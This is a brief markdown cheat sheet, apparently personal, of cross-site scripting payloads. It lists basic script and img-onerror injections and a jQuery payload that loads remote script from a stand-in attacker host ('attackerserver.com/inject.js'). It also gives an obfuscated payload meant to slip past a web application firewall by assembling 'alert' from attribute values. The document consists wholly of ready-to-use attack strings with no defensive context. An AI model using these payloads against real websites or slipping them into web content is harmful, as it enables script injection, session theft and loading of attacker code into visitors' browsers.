# My collection of XSS

## Regular XSS
<script>alert(document.domain)</script>
"><img src=x onerror="alert(document.domain)"/>

## Enabled jQuery
<body onpointerenter="jQuery.getScript('https:/' +'/attackerserver.com/inject.js')">

## Bypass WAF
<body%20alt=al%20lang=ert%20onmouseenter="top['al'+lang](/Piya/)
